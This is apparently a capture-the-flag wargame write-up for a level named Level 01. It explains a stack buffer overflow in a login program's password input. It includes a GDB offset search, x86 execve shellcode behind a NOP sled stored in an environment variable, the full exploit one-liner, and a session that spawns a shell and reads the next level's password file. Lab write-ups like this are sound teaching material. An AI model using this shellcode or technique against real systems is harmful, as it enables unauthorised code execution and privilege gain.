
# Level 01

## Overview
This level implements a login system with username and password verification. The vulnerability lies in a classic buffer overflow in the password input that can be exploited to gain shell access by injecting shellcode via an environment variable.

## The Challenge

1. Prompts for username (expects "dat_wil")
2. Verifies username with `verify_user_name()`
3. Prompts for password
4. Verifies password with `verify_user_pass()` (expects "admin")
5. Vulnerable `fgets()` call allows buffer overflow

### Key Vulnerabilities
```
fgets(&buf, 0x64, stdin);  
```

The buffer can be overflowed to overwrite the return address and redirect execution to shellcode stored in an environment variable.

## Exploitation Process

### Step 1: Find the Offset
Using pattern analysis in GDB:

```bash
(gdb) run
Enter Username: dat_wil
Enter Password: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
```

The program crashes at `0x55555555` which corresponds to "UUUU" in the pattern.

- **Offset to EIP: 80 bytes**

### Step 2: Store Shellcode in Environment

Instead of injecting shellcode directly into the buffer, we store it in an environment variable with a large NOP sled:
```
export SHELLCODE=$(python -c "print '\x90'*1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
```



### Step 3: Find Environment Variable Address

The address `0xffffd863` points to somewhere in the NOP sled of our SHELLCODE environment variable. Thanks to the 1000-byte NOP sled, we have a large landing zone.

### Step 4: Execute the Exploit
```
export SHELLCODE=$(python -c "print '\x90'*1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")

(python -c "print 'dat_wil'"; python -c "print 'B'*80 + '\x63\xd8\xff\xff'"; cat) | ./level01
```

## Solution
```
level01@OverRide:~$ export SHELLCODE=$(python -c "print '\x90'*1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")

level01@OverRide:~$ (python -c "print 'dat_wil'"; python -c "print 'B'*80 + '\x63\xd8\xff\xff'"; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
$ whoami
level02
$ cat /home/users/level02/.pass
[flag here]
```

## Exploit Structure
```
Input 1 (Username): "dat_wil\n"
Input 2 (Password): [80 bytes of 'B'] + [Return Address: \x63\xd8\xff\xff]
                    └─────────────┘     └──────────────────────────────┘
                     Fill buffer         Points to SHELLCODE in env
```

## Why This Method Works

### Environment Variable Technique
1. **Large NOP Sled**: 1000 bytes of `\x90` instructions create a huge target
2. **Stable Address**: Environment variables are stored at predictable locations in high memory
3. **Reliability**: Even if the exact address varies slightly, execution slides through NOPs to shellcode
4. **Cleaner Payload**: Only need to overwrite return address, no inline shellcode in stdin

### Address Space Layout
```
High Memory
├── Environment Variables (SHELLCODE lives here)
│   └── 0xffffd863 ← Our return address points here
├── Stack (grows downward)
│   └── Buffer overflow happens here
└── ...
Low Memory
```
## Summary
# Attack Vector

-  Type: Stack-based buffer overflow
- Target: Return address overwrite
- Method: Environment variable shellcode injection
- Technique: ret2shellcode with NOP sled

# Exploitation Steps

1. Export shellcode (1000 NOPs + payload) to environment
2. Find approximate address of shellcode in memory
3. Overflow password buffer with 80 bytes + return address
4. Return address points to NOP sled
5. Execution slides through NOPs to shellcode
6. Shellcode spawns /bin/sh
7. Shell access as level02 user

